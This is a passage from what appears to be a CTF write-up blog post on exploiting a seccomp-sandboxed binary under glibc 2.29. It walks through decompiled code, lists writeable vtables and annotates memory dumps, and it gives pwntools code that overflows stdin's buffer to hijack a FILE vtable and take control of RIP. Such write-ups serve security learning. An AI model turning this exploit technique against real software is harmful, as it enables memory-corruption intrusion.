class="comment">// [rsp+18h] [rbp-18h]</span></span><br><span class="line">  __int64 v5; <span class="comment">// [rsp+20h] [rbp-10h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v6; <span class="comment">// [rsp+28h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v6 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  v5 = <span class="number">0L</span>L;</span><br><span class="line">  sandbox(argc, argv, envp);</span><br><span class="line">  nohack();</span><br><span class="line">  main_init(argc);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"gift : %p\n"</span>, &amp;system);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"1 : "</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">"%llx %llx"</span>, &amp;v4, &amp;v5);</span><br><span class="line">  *v4 = v5;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"2 : "</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">"%llx %llx"</span>, &amp;v4, &amp;v5);</span><br><span class="line">  *v4 = v5;</span><br><span class="line">  fclose(<span class="built_in">stdout</span>);</span><br><span class="line">  fclose(<span class="built_in">stdin</span>);</span><br><span class="line">  fclose(<span class="built_in">stderr</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>There’s not much in the main from it we can get:</p><ul><li>free libc leak </li><li>two arbitrary writes (scanfs)</li><li><code>fclose(stdout)</code>, <code>fclose(stdin)</code> and <code>fclose(stderr)</code> (important for the exploit).</li></ul><h4 id="sandbox-function"><a href="#sandbox-function" class="headerlink" title="sandbox function"></a>sandbox function</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">__<span class="function">int64 <span class="title">sandbox</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v1; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v1 = seccomp_init(<span class="number">0L</span>L);</span><br><span class="line">  <span class="keyword">if</span> ( !v1 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"seccomp error"</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  seccomp_rule_add(v1, <span class="number">2147418112L</span>L, <span class="number">15L</span>L, <span class="number">0L</span>L);</span><br><span class="line">  seccomp_rule_add(v1, <span class="number">2147418112L</span>L, <span class="number">3L</span>L, <span class="number">0L</span>L);</span><br><span class="line">  seccomp_rule_add(v1, <span class="number">2147418112L</span>L, <span class="number">10L</span>L, <span class="number">0L</span>L);</span><br><span class="line">  seccomp_rule_add(v1, <span class="number">2147418112L</span>L, <span class="number">9L</span>L, <span class="number">0L</span>L);</span><br><span class="line">  seccomp_rule_add(v1, <span class="number">2147418112L</span>L, <span class="number">12L</span>L, <span class="number">0L</span>L);</span><br><span class="line">  seccomp_rule_add(v1, <span class="number">2147418112L</span>L, <span class="number">2L</span>L, <span class="number">0L</span>L);</span><br><span class="line">  seccomp_rule_add(v1, <span class="number">2147418112L</span>L, <span class="number">0L</span>L, <span class="number">0L</span>L);</span><br><span class="line">  seccomp_rule_add(v1, <span class="number">2147418112L</span>L, <span class="number">1L</span>L, <span class="number">0L</span>L);</span><br><span class="line">  seccomp_rule_add(v1, <span class="number">2147418112L</span>L, <span class="number">60L</span>L, <span class="number">0L</span>L);</span><br><span class="line">  seccomp_rule_add(v1, <span class="number">2147418112L</span>L, <span class="number">231L</span>L, <span class="number">0L</span>L);</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="keyword">int</span>)seccomp_load(v1) &lt; <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    seccomp_release(v1);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"seccomp error"</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> seccomp_release(v1);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>The author uses seccomp to only allow a few syscalls:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">sym.imp.seccomp_rule_add(iVar2, <span class="number">0x7fff0000</span>, <span class="number">0xf</span>, <span class="number">0</span>); # SCMP_ACT_ALLOW  sys_rt_sigreturn</span><br><span class="line">sym.imp.seccomp_rule_add(iVar2, <span class="number">0x7fff0000</span>, <span class="number">3</span>, <span class="number">0</span>); # sys_close</span><br><span class="line">sym.imp.seccomp_rule_add(iVar2, <span class="number">0x7fff0000</span>, <span class="number">10</span>, <span class="number">0</span>); # sys_mprotect</span><br><span class="line">sym.imp.seccomp_rule_add(iVar2, <span class="number">0x7fff0000</span>, <span class="number">9</span>, <span class="number">0</span>); # sys_mmap</span><br><span class="line">sym.imp.seccomp_rule_add(iVar2, <span class="number">0x7fff0000</span>, <span class="number">0xc</span>, <span class="number">0</span>); # sys_brk</span><br><span class="line">sym.imp.seccomp_rule_add(iVar2, <span class="number">0x7fff0000</span>, <span class="number">2</span>, <span class="number">0</span>); # sys_open</span><br><span class="line">sym.imp.seccomp_rule_add(iVar2, <span class="number">0x7fff0000</span>, <span class="number">0</span>, <span class="number">0</span>); # sys_read</span><br><span class="line">sym.imp.seccomp_rule_add(iVar2, <span class="number">0x7fff0000</span>, <span class="number">1</span>, <span class="number">0</span>); # sys_write</span><br><span class="line">sym.imp.seccomp_rule_add(iVar2, <span class="number">0x7fff0000</span>, <span class="number">0x3c</span>, <span class="number">0</span>); # sys_exit</span><br><span class="line">sym.imp.seccomp_rule_add(iVar2, <span class="number">0x7fff0000</span>, <span class="number">0xe7</span>, <span class="number">0</span>); # sys_exit_group</span><br></pre></td></tr></table></figure><p>So we don’t have <strong>execve</strong> syscall so we can’t get a proper shell, but we still have <strong>sys_write</strong>,<strong>sys_read</strong>,<strong>sys_write</strong> which can be used to read the flag file from a path location.</p><h4 id="nohack-function"><a href="#nohack-function" class="headerlink" title="nohack function"></a>nohack function</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">nohack</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">if</span> ( ((_WORD)<span class="built_in">stdout</span> + <span class="number">2208</span>) &amp; <span class="number">0xFFF</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"mprotect error"</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> mprotect(&amp;<span class="built_in">stdout</span>[<span class="number">10</span>]._IO_write_end, <span class="number">0x700</span>uLL, <span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>In <strong>libc-2.29</strong> the permissions to write in vtables are enabled so the author decided to make them read only but he did a mistake in setting the ranges, he missed a couple of tables:</p><h4 id="Blocked-vtables-from-the-author"><a href="#Blocked-vtables-from-the-author" class="headerlink" title="Blocked vtables from the author:"></a>Blocked vtables from the author:</h4><ul><li>_IO_wfile_jumps_mmap</li><li>_IO_wfile_jumps</li><li>_IO_wmem_jumps</li><li>_IO_mem_jumps</li><li>_IO_strn_jumps</li><li>_IO_obstack_jumps</li><li>_IO_file_jumps_maybe_mmap</li><li>_IO_file_jumps_mmap</li><li>_IO_file_jumps</li><li>_IO_str_jumps</li></ul><h4 id="Unblocked-vtables"><a href="#Unblocked-vtables" class="headerlink" title="Unblocked vtables:"></a>Unblocked vtables:</h4><ul><li>_IO_helper_jumps</li><li>_IO_cookie_jumps</li><li>_IO_proc_jumps</li><li>_IO_str_chk_jumps</li><li>_IO_wstrn_jumps</li><li>_IO_wfile_jumps_maybe_mmap</li></ul><p>Because of this the only thing we need to do is to change the <strong>vtable pointer</strong> into one of the writeable vtables to get control of rip.</p><h3 id="Get-arbitrary-write-with-“unlimited”-input"><a href="#Get-arbitrary-write-with-“unlimited”-input" class="headerlink" title="Get arbitrary write with “unlimited” input"></a>Get arbitrary write with “unlimited” input</h3><p>First thing we notice is that we have two very limited arbitrary writes with a max size of <strong>long long</strong> and we can only change <strong>two</strong> locations in memory.</p><p>This is the uninitialised <code>_IO_2_1_stdin_</code>:<br><a data-fancybox="gallery" href="https://i.imgur.com/NjshmMi.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/NjshmMi.png" alt><br></a><br>What happens next depends on <strong>setvbuf</strong> option:<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main_init</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0L</span>L, <span class="number">2</span>, <span class="number">0L</span>L);</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0L</span>L, <span class="number">2</span>, <span class="number">0L</span>L);</span><br><span class="line">  <span class="keyword">return</span> setvbuf(<span class="built_in">stderr</span>, <span class="number">0L</span>L, <span class="number">2</span>, <span class="number">0L</span>L);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>From <a href="http://www.cplusplus.com/reference/cstdio/setvbuf/" target="_blank" rel="noopener">here</a> we know the option used is <code>_IONBF</code> which means “No buffering” the buffer is <strong>not</strong> used. Each I/O operation is written as <strong>soon</strong> as possible. This a usual thing in ctfs to disable buffering of <strong>stdout</strong>, <strong>stdin</strong> and <strong>stderr</strong> and this time is very handy for us because instead of allocating a new buffer on the heap, the limits of <code>_IO_buf_base</code> and <code>_IO_buf_end</code> will be defined with pointers within stdin where <code>_IO_buf_end-_IO_buf_base = 1</code> saving only 1 character which will be the end line character (‘\n’ or ‘’ depends on the input).</p><p>Here is the <strong>stdin</strong> after being initialized by <strong>setvbuf</strong>:<br><a data-fancybox="gallery" href="https://i.imgur.com/leh8S9p.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/leh8S9p.png" alt><br></a><br>If we use the first <strong>scanf</strong> to increase the value of <code>stdio-&gt;_IO_buf_end</code>, instead of only controlling the <code>_shortbuf</code> field we will be able to control the contents of what comes next:<br><a data-fancybox="gallery" href="https://i.imgur.com/odMGD5L.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/odMGD5L.png" alt><br></a><br>Also the libc source code can be found <a href="https://github.com/lattera/glibc/blob/895ef79e04a953cac1493863bcae29ad85657ee1/libio/fileops.c#L1326" target="_blank" rel="noopener">at</a>:<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (fp-&gt;_IO_buf_base</span><br><span class="line">          &amp;&amp; want &lt; (<span class="keyword">size_t</span>) (fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base)) <span class="comment">// sub must be positive</span></span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">if</span> (__underflow (fp) == EOF)</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">          <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* These must be set before the sysread as we might longjmp out</span></span><br><span class="line"><span class="comment">         waiting for input. */</span></span><br><span class="line">      _IO_setg (fp, fp-&gt;_IO_buf_base, fp-&gt;_IO_buf_base, fp-&gt;_IO_buf_base);</span><br><span class="line">      _IO_setp (fp, fp-&gt;_IO_buf_base, fp-&gt;_IO_buf_base);</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* Try to maintain alignment: read a whole number of blocks.  */</span></span><br><span class="line">      count = want;</span><br><span class="line">      <span class="keyword">if</span> (fp-&gt;_IO_buf_base)</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">size_t</span> block_size = fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base;</span><br><span class="line">          <span class="keyword">if</span> (block_size &gt;= <span class="number">128</span>)</span><br><span class="line">        count -= want % block_size; <span class="comment">// writing in blocks </span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">      count = _IO_SYSREAD (fp, s, count); <span class="comment">// we want to reach here in order to complete the read</span></span><br></pre></td></tr></table></figure></p><p>Much better images explaining the code above can be found in <a href="https://www.slideshare.net/AngelBoy1/play-with-file-structure-yet-another-binary-exploit-technique" target="_blank" rel="noopener">Angelboy</a> slides.</p><p>Python code:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">r.sendlineafter(<span class="string">'1 : '</span>, <span class="string">"%x %x"</span> %(_IO_2_1_STDIN_+_IO_BUF_END,_IO_2_1_STDIN_+<span class="number">0x2000</span>))</span><br></pre></td></tr></table></figure><h3 id="Filling-the-memory"><a href="#Filling-the-memory" class="headerlink" title="Filling the memory"></a>Filling the memory</h3><p>From the initial plan we know we must change values on <code>_IO_2_1_STDOUT-&gt;file-&gt;vtable</code>, and values on the <code>_IO_helper_jumps</code> vtable but there will be a lot of values in the middle because we are overflowing everything from the very beginning, in this case from the <strong>stdin</strong> we can’t just fill everything with nulls and expect everything to run smoothly , obviously the program will break if we do that we need to keep an eye on the fields that contain mappable addresses.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"> _lock(1st) and _wide_data(2nd) and vtable(last) fields must have </span><br><span class="line"> a valid mappable address preferable to the original ones(_lock).</span><br><span class="line">                                                            ^</span><br><span class="line">0x7fb4561efa80 &lt;_IO_2_1_stdin_+128&gt;:    0x000000000a000000  |__ 0x00007fb4561f2590</span><br><span class="line">0x7fb4561efa90 &lt;_IO_2_1_stdin_+144&gt;:    0xffffffffffffffff  |   0x0000000000000000</span><br><span class="line">0x7fb4561efaa0 &lt;_IO_2_1_stdin_+160&gt;:    0x00007fb4561efae0 _|   0x0000000000000000 </span><br><span class="line">0x7fb4561efab0 &lt;_IO_2_1_stdin_+176&gt;:    0x0000000000000000  |   0x0000000000000000</span><br><span class="line">0x7fb4561efac0 &lt;_IO_2_1_stdin_+192&gt;:    0x00000000ffffffff  |   0x0000000000000000</span><br><span class="line">0x7fb4561efad0 &lt;_IO_2_1_stdin_+208&gt;:    0x0000000000000000  |__ 0x00007fb4561f1560</span><br><span class="line">0x7fb4561efae0 &lt;_IO_wide_data_0&gt;:       0x0000000000000000      0x0000000000000000</span><br><span class="line">........</span><br><span class="line">0x7fb4561efc10 &lt;_IO_wide_data_0+304&gt;:   0x00007fb4561f1020      0x0000000000000000</span><br><span class="line">0x7fb4561efc20 &lt;__memalign_hook&gt;:       0x00007fb4560a4190      0x0000000000000000 -&gt; Can be filled with 0s</span><br><span class="line">0x7fb4561efc30 &lt;__malloc_hook&gt;: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x7fb4561efc40 &lt;main_arena&gt;:    0x0000000000000000      0x0000000000000001-----------|</span><br><span class="line">......                                                                               |-&gt; Can be filled with 0s</span><br><span class="line">0x7fb4561f04d0 &lt;main_arena+2192&gt;:       0x0000000000021000      0x00007fb4560a5a90---|</span><br><span class="line">0x7fb4561f0520 &lt;default_overflow_region&gt;:       0x0000000000000000      0x0000000000000001 --|                                                                </span><br><span class="line">0x7fb4561f0530 &lt;default_overflow_region+16&gt;:    0x0000000000000002      0x00007fb4561f32d8   |                                                            </span><br><span class="line">0x7fb4561f0540 &lt;default_overflow_region+32&gt;:    0x0000000000000000      0xffffffffffffffff   |                                                             </span><br><span class="line">0x7fb4561f0550 &lt;__libc_utmp_jump_table&gt;:        0x00007fb4561ee6e0      0x00007fb4561c1e48   |-&gt; must be filled                                                            </span><br><span class="line">0x7fb4561f0560 &lt;_nl_global_locale&gt;:     0x00007fb4561ec580      0x00007fb4561ecac0           |with the correct                                                              </span><br><span class="line">...............                                                                              |values otherwise </span><br><span class="line">0x7fb4561f0640 &lt;_nl_global_locale+224&gt;: 0x00007fb4561bc678      0x0000000000000000 ----------|page fault.                                                             </span><br><span class="line">0x7fb4561f0650: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x7fb4561f0660 &lt;_IO_list_all&gt;:  0x00007fb4561f0680      0x0000000000000000 --&gt; Keep this too</span><br><span class="line">0x7fb4561f0670: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x7fb4561f0680 &lt;_IO_2_1_stderr_&gt;:       0x00000000fbad2087      0x00007fb4561f0703 --|-&gt;calculate the offsets                                                                        </span><br><span class="line">.....                                                                                |from the libc_base to</span><br><span class="line">0x7fb4561f0750 &lt;_IO_2_1_stderr_+208&gt;:   0x0000000000000000      0x00007fb4561f1560 --|read original values                                                                        </span><br><span class="line">0x7fb4561f0760 &lt;_IO_2_1_stdout_&gt;:       0x00000000fbad2887      0x00007fb4561f07e3 --|-&gt; Everything remains the                                                                       </span><br><span class="line">....                                                                               --|same</span><br><span class="line">0x7fb4561f0830 &lt;_IO_2_1_stdout_+208&gt;:   0x0000000000000000      0x00007fb4561f1560 -&gt; Change to _IO_helper_jumps                                                                         </span><br><span class="line">0x7fb4561f0840 &lt;stderr&gt;:        0x00007fb4561f0680      0x00007fb4561f0760--|-&gt; Stays the same</span><br><span class="line">0x7fb4561f0850 &lt;stdin&gt;: 0x00007fb4561efa00      0x00007fb456031e90----------|</span><br><span class="line">0x7fb4561f0860 &lt;__elf_set___libc_subfreeres_element_free_mem__&gt;:        0x00007fb45619fdd0--|-&gt; can be filled</span><br><span class="line">...                                                                                         |with 0s. </span><br><span class="line">0x7fb4561f0940 &lt;__elf_set___libc_subfreeres_element_pw_map_free__&gt;:     0x00007fb4561a1d10--|      </span><br><span class="line">0x7fb4561f0950: 0x0000000000000000      0x0000000000000000</span><br><span class="line">                                                           |-&gt; the address that will control RIP</span><br><span class="line">0x7fb4561f0960 &lt;_IO_helper_jumps&gt;:      0x0000000000000000 |    0x0000000000000000</span><br><span class="line">0x7fb4561f0970 &lt;_IO_helper_jumps+16&gt;:   0x00007fb45609ca70_|    0x00007fb45607f530</span><br><span class="line">0x7fb4561f0980 &lt;_IO_helper_jumps+32&gt;:   0x00007fb45609c140      0x00007fb45609c150</span><br><span class="line">0x7fb4561f0990 &lt;_IO_helper_jumps+48&gt;:   0x00007fb45609d7b0      0x00007fb45609c1b0</span><br><span class="line">0x7fb4561f09a0 &lt;_IO_helper_jumps+64&gt;:   0x00007fb45609c3b0      0x00007fb45609cae0</span><br><span class="line">0x7fb4561f09b0 &lt;_IO_helper_jumps+80&gt;:   0x00007fb45609c800      0x00007fb45609c6d0</span><br><span class="line">0x7fb4561f09c0 &lt;_IO_helper_jumps+96&gt;:   0x00007fb45609ca60      0x00007fb45609c870</span><br><span class="line">0x7fb4561f09d0 &lt;_IO_helper_jumps+112&gt;:  0x00007fb45609d910      0x00007fb45609d920</span><br><span class="line">0x7fb4561f09e0 &lt;_IO_helper_jumps+128&gt;:  0x00007fb45609d8f0      0x00007fb45609ca60</span><br><span class="line">0x7fb4561f09f0 &lt;_IO_helper_jumps+144&gt;:  0x00007fb45609d900      0x0000000000000000</span><br><span class="line">0x7fb4561f0a00 &lt;_IO_helper_jumps+160&gt;:  0x0000000000000000      0x0000000000000000</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>Now in python, filling <strong>stdin</strong>:<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># STDIN+131</span></span><br><span class="line">INPUT2 =<span class="string">'\x0a'</span>+<span class="string">'\x00'</span>*<span class="number">4</span><span class="comment"># p64(_IO_STDFILE_0_LOCK)</span></span><br><span class="line">INPUT2 += p64(_IO_STDFILE_0_LOCK)</span><br><span class="line">INPUT2 += p64(<span class="number">-0x1</span>, signed=<span class="keyword">True</span>) <span class="comment"># _offset</span></span><br><span class="line">INPUT2 += p64(<span class="number">0x0</span>) <span class="comment"># _codecvt</span></span><br><span class="line">INPUT2 += p64(_IO_WIDE_DATA_0) <span class="comment"># _wide_data</span></span><br><span class="line">INPUT2 += p64(<span class="number">0x0</span>) <span class="comment"># _freeres_list</span></span><br><span class="line">INPUT2 += p64(<span class="number">0x0</span>) <span class="comment"># _freeres_buf</span></span><br><span class="line">INPUT2 += p64(<span class="number">0x0</span>) <span class="comment"># __pad5</span></span><br><span class="line">INPUT2 += p32(<span class="number">-0x1</span>, signed=<span class="keyword">True</span>) <span class="comment"># _mode</span></span><br><span class="line">INPUT2 += p32(<span class="number">0x0</span>) <span class="comment"># _unused2</span></span><br><span class="line">INPUT2 += p64(<span class="number">0x0</span>) <span class="comment"># _unused2</span></span><br><span class="line">INPUT2 += p64(<span class="number">0x0</span>) <span class="comment"># _unused2</span></span><br><span class="line">INPUT2 += p64(_IO_FILE_JUMPS) <span class="comment"># vtable"""</span></span><br><span class="line">INPUT2 += p64(<span class="number">0x0</span>)*<span class="number">19</span>*<span class="number">2</span> + p64(LIBC+<span class="number">0x1bb020</span>)+p64(<span class="number">0x0</span>)</span><br><span class="line">INPUT2 += p64(LIBC+libc.symbols[<span class="string">'__memalign_hook'</span>]) <span class="comment"># __memalign_hook</span></span><br><span class="line">INPUT2 += p64(<span class="number">0x0</span>)</span><br><span class="line">INPUT2 += p64(<span class="number">0x0</span>)+p64(<span class="number">0x0</span>)</span><br></pre></td></tr></table></figure></p><p>Filling from <strong>main_arena</strong> until the end of <code>_nl_global_locale</code>:<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">INPUT2 += <span class="string">'\x00'</span>*<span class="number">2208</span> <span class="comment"># MAIN_ARENA</span></span><br><span class="line">INPUT2 += p64(LIBC+<span class="number">0x896b0</span>) + p64(<span class="number">0x0</span>) <span class="comment"># obstack_alloc_failed_handler</span></span><br><span class="line">INPUT2 += p64(LIBC+<span class="number">0x185072</span>)*<span class="number">2</span> <span class="comment"># tzname</span></span><br><span class="line">INPUT2 += p64(<span class="number">0</span>)*<span class="number">4</span> <span class="comment"># program_invocation_short_name</span></span><br><span class="line">INPUT2 += p64(<span class="number">0</span>)+p64(<span class="number">1</span>)+p64(<span class="number">2</span>)+p64(LIBC+<span class="number">0x1bd2d8</span>)+p64(<span class="number">0</span>)+p64(<span class="number">-0x1</span>,signed=<span class="keyword">True</span>) <span class="comment"># default_overflow_region</span></span><br><span class="line">INPUT2 += p64(LIBC)+p64(LIBC) <span class="comment"># __libc_utmp_jump_table</span></span><br><span class="line">    </span><br><span class="line"><span class="comment"># _nl_global_locale</span></span><br><span class="line">OFFSETLIST = [<span class="number">1971584</span>, <span class="number">1972928</span>, <span class="number">1973056</span>, <span class="number">1975232</span>, <span class="number">1972480</span>, <span class="number">1972352</span>, <span class="number">0</span>, <span class="number">1974400</span>, <span class="number">1974496</span>, <span class="number">1974624</span>, <span class="number">1974816</span>, <span class="number">1974944</span>, <span class="number">1975040</span>, <span class="number">1680352</span>, <span class="number">1676512</span>, <span class="number">1678048</span>, <span class="number">1775224</span>, <span class="number">1775224</span>, <span class="number">1775224</span>, <span class="number">1775224</span>, <span class="number">1775224</span>, <span class="number">1775224</span>, <span class="number">1775224</span>, <span class="number">1775224</span>, <span class="number">1775224</span>, <span class="number">1775224</span>, <span class="number">1775224</span>, <span class="number">1775224</span>, <span class="number">1775224</span>, <span class="number">0</span>]</span><br><span class="line"><span class="keyword">for</span> offset <span class="keyword">in</span> OFFSETLIST:</span><br><span class="line">    <span class="keyword">if</span> offset == <span class="number">0</span>:</span><br><span class="line">        INPUT2 += p64(<span class="number">0</span>)</span><br><span class="line">    <span class="keyword">else</span>:    </span><br><span class="line">        INPUT2 += p64(LIBC+offset)</span><br><span class="line">INPUT2 += p64(<span class="number">0</span>)*<span class="number">2</span></span><br><span class="line">INPUT2 += p64(_IO_LIST_ALL+<span class="number">0x20</span>)+p64(<span class="number">0</span>)*<span class="number">3</span> <span class="comment"># IO_LIST_ALL</span></span><br></pre></td></tr></table></figure></p><p>Filling <strong>stderr</strong>:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># STDERR</span></span><br><span class="line">INPUT2 += p64(<span class="number">0xfbad2887</span>) <span class="comment"># _flags</span></span><br><span class="line">INPUT2 += p64(_IO_2_1_STDERR_+<span class="number">131</span>) <span class="comment"># _IO_read_ptr</span></span><br><span class="line">INPUT2 += p64(_IO_2_1_STDERR_+<span class="number">131</span>) <span class="comment"># _IO_read_end</span></span><br><span class="line">INPUT2 += p64(_IO_2_1_STDERR_+<span class="number">131</span>) <span class="comment"># _IO_read_base</span></span><br><span class="line">INPUT2 += p64(_IO_2_1_STDERR_+<span class="number">131</span>) <span class="comment"># _IO_write_base</span></span><br><span class="line">INPUT2 += p64(_IO_2_1_STDERR_+<span class="number">131</span>) <span class="comment"># _IO_write_ptr</span></span><br><span class="line">INPUT2 += p64(_IO_2_1_STDERR_+<span class="number">131</span>) <span class="comment"># _IO_write_end</span></span><br><span class="line">INPUT2 += p64(_IO_2_1_STDERR_+<span class="number">131</span>) <span class="comment"># _IO_buf_base</span></span><br><span class="line">INPUT2 += p64(_IO_2_1_STDERR_+<span class="number">132</span>) <span class="comment"># _IO_buf_end</span></span><br><span class="line">INPUT2 += p64(<span class="number">0x0</span>) <span class="comment"># _IO_save_base</span></span><br><span class="line">INPUT2 